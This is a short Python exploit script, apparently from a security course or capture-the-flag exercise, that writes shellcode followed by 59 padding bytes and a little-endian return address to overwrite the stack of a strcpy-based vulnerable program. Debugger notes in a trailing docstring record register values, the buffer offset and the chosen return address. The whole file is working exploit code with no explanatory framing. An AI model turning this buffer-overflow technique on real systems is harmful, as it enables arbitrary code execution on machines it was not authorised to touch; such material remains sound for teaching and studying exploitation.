from shellcode import shellcode
import sys
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*59+0xfff6ed9C.to_bytes(4,'little'))
"""

vulnerable return address: 0x08048c6d
strcpy address:0x08048c17

This is to see the buf begin relative to ebp
offset = 120
esp            0xfff6ed90          0xfff6ed90    60816
ebp            0xfff6ee08          0xfff6ee08    60936


after strcpy
esp            0xfff6ed80          0xfff6ed80
ebp            0xfff6ee08          0xfff6ee08

new return address:0xfff6ed9C
end of shell, start of new:0xfff6edd0  60880

0xfff6ee0c 60940-60880

0x08048c17
"""